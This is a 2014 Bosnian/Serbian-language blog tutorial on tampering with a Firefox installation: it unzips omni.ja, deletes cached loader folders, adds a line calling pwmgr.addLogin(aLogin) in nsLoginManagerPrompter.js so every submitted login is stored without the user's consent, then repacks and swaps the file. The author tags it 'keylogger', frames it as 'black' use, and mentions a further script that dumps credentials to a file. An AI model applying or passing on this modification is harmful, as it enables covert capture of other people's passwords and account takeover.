---
title: Hacking Firefox for fun & lo<3
date: Oct 10 2014
tags: ["firefox", "omni", "keylogger", "vuln"]
---

**Napomena**: Ovaj tutorial je pisan u 2014. godini, a objavljen 2016. Sretna nova godina!

## Intro
Kako dugo nisam pisao nijedan post na blogu a imam veliku želju da ga držim što je moguće ažuriranim, sjetio sam se da nešta napišem.
  
Danas ću pisati o tome na koji način možete da koristeći se outline funkcijama u Firefox automatski spasite sve šifre ukucane u formu bez ikakvog dodatnog pritiska na dugme "Remember Me", a ne koristeći se nijednom external bibliotekom.  
  
Sam uvod ću početi tako što ću opisati algoritam i postupak rada. Prvo ćemo uzeti u obzir da je Mozillin web-pretraživač naziva **Firefox** otvorenog koda te ako volite da 'hakirate' (čitaj: buljite u monitor / text-editor), isti možete preuzeti i re-programirati sa svojim very-own funckijama i dodatcima.  
  
**Firefox** je kao što sam već naveo open-source projekat na kojem rade veliki majstori u društvenom remote ili lokal okruženju pod nazivom **Mozilla Community**. Njihov posao je da u slobodno vrijeme ažuriraju kod, traže rupe, pridodaju ideje, pišu dokumente, bacaju hejt, i tome slično. Međutim, Firefox je vrlo rasprostranjen u upotrebi u poslovnom i privatnom aražmanu. To određenim ljudima predstavlja jednu ideologiju u kojoj se razmišljajući na drugi način, obuhvata i *crno* korištenje i zloupotrebljavanje tog koda na način da se rupe ne prijavljuju nego da se koriste u određene svrhe.  
  
Da pređemo na posao, u napomenu bi još stavio i to da svako može da prati ovaj tutorijal ako ima iole znanja u informatici te nix sistemima. Zašto nix? Zato što se ja vrtim na njemu dok pišem ovaj tekst. **Tutorijal važi i za Windows build Firefoxa**!
  
    Verzija: pod kojom radim je Mozilla Firefox 32.0.3
    Sistem : na kojem radim je Crunchbang Waldorf (Debian)
 
## Firefox + JS = </3
Mozilla Firefox ima djelimično zanimljiv koncept rada, a on se bazira na jednostavnim modulima ispisanim u JavaScript. Firefox naime koristi Javascript (vjerovatno pomoću raznih frameworka) i kao add-on language-of-choice i kao njegov izvorni core pojedinih funkcija. Samim tim možemo slobodno reći da Firefox omogućava svim korisnicima da jednim jezikom izvedu više operacija te da se dijeljenje funkcija i procedura obostrano koristi.
  
Razlog zašto pričam o ovome je taj da se i princip internog logiranja bazira na već naglašenoj Javascript proceduri. Ako se pitate zašto...
  
## Omni.ja (.ti, .on, .oni, .mi, .vi?)
Čudan header, a šta je to **OMNI**.ja --- Omni je skup lokaliziranih fajlova koji čine Firefox preference i kodove otvorenog tipa. Omni.ja je u ranijim verzijama Firefoxa bio prepoznatljiv po nazivu Omni.**JAR**, dok u još ranijim verzijama nije ni postojao nego su svi fajlovi bili smješteni u folderu Firefox instalacije. Razlog zašto je Firefox zamrsio posao i meni, i vama i svima koji prate tutorijal je upravo taj, zbog sigurnosnih razloga (a i zbog I/O loading procedura koje su sad brže).

Više o Omni.ja fajlovima možete pročitati na **Mozilla Developer Network** stranici  [ovdje](https://developer.mozilla.org/en-US/docs/Mozilla/About_omni.ja_%28formerly_omni.jar%29) . 

## O kakvom problemu je riječ?
**Omni.ja** fajl ne završava sa prepoznatljivom ekstenzijom ".jar" samo zato što šugavi Windows System Restore ne spašava istu, pa se Mozilla rekompilacijom odlučila za **.ja** ekstenzijom, ali je tu proceduru ubacila i u *nix izdanjima što je sasvim logično budući da se radi o otvorenom projektu.

Da vidimo o kakvom je fajlu riječ, uradio sam hexdump prvih 10 bajtova:

    medo@server:/opt/firefox$ hexdump -C -n 10 omni.ja 
    00000000  50 4b 03 04 14 00 02 00  08 00                    |PK........|

Uuu.. zanimljivo zvuči, nešta kao.. Čekaj, čekaj :-)

    medo@server:/opt/firefox$ file omni.ja 
    omni.ja: Zip archive data, at least v2.0 to extract

Tu sam te čekao. Našom malom, privatnom investigacijom, došli smo do zaključka da je to ustvari samo **ZIP fajl**, baš kao što piše i na MDN (Izvinite na sarkazmu). Pratite me, kopirajte originalni omni.ja u novi folder.

    medo@server:/opt/firefox$ sudo mkdir omninew && sudo cp omni.ja omninew/

Odlično, idemo dalje. Sad ide unzip po default opcijama, ili kako vama odgovara, samo ne dirajte headere i to je to.

    $ sudo unzip omni.ja
    $ sudo rm omni.ja

Sad su nam ostale samo bitne stvari, malo editovanja, spašavanje, zipovanje i to je to.

## Cached files zadaju probleme - po prvi put
U biti, cached fajlovi nam nikad ne bi trebali zadavati probleme, oni su tu da ubrzaju repetativni proces, ali u ovom slučaju zadaju. Ako su u default **Omni.ja** fajlovima smještene cached procedure (a jesu), naš novo-kompanovani fajl se ne bi re-kešao jer Firefoxu to nije potrebno. 

Kešovani fajlovi unutar Omni.ja se nalaze u direktoriju naziva **jaloader** i **jssubloader** (zahvaljujem se Archaeopteryx i jdm korisnicima sa oficijalnog IRC MDN-a što su me pointali zbog problema) i ako ti fajlovi nisu izbrisani prije re-zipovanja, naš kod kao što sam već rekao neće ni raditi.

    $ sudo rm -rf jsloader/ && sudo rm -rf jssubloader/

Šta sad?

## Pozivanje pre-definisanih funkcija
Ako uđemo unutar direktorija **components** možemo vidjeti razne **.js** fajlove a isti služe da ih Firefox poziva tokom load-time ili run-time. Ovi fajlovi su kao što sam već naveo dio Mozillinih modula i ostvaruju mogućnost re-edita i kompilacije pojedinih stvari. Mi ćemo u jednom od tih fajlova ispisati jednu liniju koda koja će se pozvati onda kada mi to budemo željeli.

    omninew $ ls
    chrome  chrome.manifest  **components**  defaults  greprefs.js  hyphenation  modules  res  update.locale
    omninew $ cd components/

Ovdje imate toliko fajlova koje će vam pružiti veliku mogućnost podešavanja Firefox-a da je to prosto nemoguće šta se sve može uraditi, a ako mi nevjerujete.

    components $ ls -l . | wc -l
    92

Sa ukupnih 92 fajla, ja mislim da je to sasvim dovoljno da se zabavljate onda kad vam je dosadno. Što se tiče današnjeg tutorijala, mene iskreno interesuje samo jedan fajl.

    components $ file nsLoginManagerPrompter.js 
    nsLoginManagerPrompter.js: ASCII text

Otvorite gore navedeni fajl u vašem najdražem code editoru (vim ftw) i idite do linije 769 odnosno do funkcije  `_showSaveLoginNotification `. Bacanjem pogleda na naziv funkcije vidimo da se ista poziva onda kada se tokom POST procesa u formi baca popup "spasi ovu lozinku" ko na slici dole samo ni nalik (ugl. da znate o čemu je riječ).

![Info-pwSaveLoginNotification](http://i.imgur.com/sshVtLd.png?1)

A tu je i komentar od strane developera.

    /*
     * _showSaveLoginNotification
     *
     * Displays a notification bar or a popup notification, to allow the user
     * to save the specified login. This allows the user to see the results of
     * their login, and only save a login which they know worked.
     *
     * @param aNotifyObj
     *        A notification box or a popup notification.
     */

Ako odemo na liniju `800` možemo primjetiti da se tu kreira nova varijabla u koju je smješten objekat `_pwmgr`.

    var pwmgr = this._pwmgr;

Ispod vidimo funckije pozivanja po odabiru dugmića koji pritišćemo (Remember Me, Not Now, Never for this site). Mi želimo da se pri svakom POST zahtjevu u login formi pozove ista funkcija kao i u Remember Me. Sve što trebamo je da dodamo jednu liniju ispod L.N. 800 tako da sve zajedno izgleda ovako.

    var pwmgr = this._pwmgr;
    pwmgr.addLogin(aLogin)

## Šta smo uradili?
Jednostavno smo pozvali varijablu (predefinisani objekat) `pwmgr`, zatim smo pozvali funkciju iz procedure `_pwmgr` koja je već definisana (`AddLogin`), a zatim unijeli informacije koje su poslane kroz zahtjev `aLogin`.

Sada nam je ostalo još repakiranje i testiranje.

## Repakiranje
U [MDN](https://developer.mozilla.org/en-US/docs/Mozilla/About_omni.ja_%28formerly_omni.jar%29) stirktno je naveden način repakiranja svih fajlova da se isti mogu loadovati bez header corruption unutar Firefox-a. 

    zip -qr9XD omni.ja *
 
Vratimo se u omninew/ direktorij a zatim pišemo sljedeću komandu.

    omninew $ sudo zip -qr9XD omni.ja *

Što znači pakiraj sve fajlove bešumno (bez listanja) i rekruzivno sa boljom kompresijom bez dodatnih atributa i bez dodavanja direktorijskih dodataka. Sve što nam je ostalo je da zamjenimo stari **Omni.ja** sa novim. Možete usput dodati i `chmod` da Firefox ima osnovne privse a to je da se samo čitaju.

    omninew $ sudo rm ../omni.ja && sudo cp omni.ja ../.

## Outro
U biti, to bi bilo to, stim da postoji dodatna funkcija koju sam napisao a koju ću zainteresovanim da pošaljem ili da postavim na blog (ako vas ima dovoljno zainteresovanih naravno) koja umjesto što spašava sve user/passwd informacije u internom Firefox password manager modulu, spašava ih u fajlu koristeći se I/O Firefox metodama koji su također na [MDN](https://developer.mozilla.org/en-US/Add-ons/Code_snippets/File_I_O). Skripta je malo duža (malo hah), i zahtjeva da unaprijed znate ove osnove.

Hvala svima koji pružaju podršku na ovaj ili onaj način. Poseban shot-out za Ljusku jer odavno nisam postavio ništa. CO: tr3x, c0ax, v0da, Krunix, marko, codex, gz4rth, Neuroticar i drugi! :-)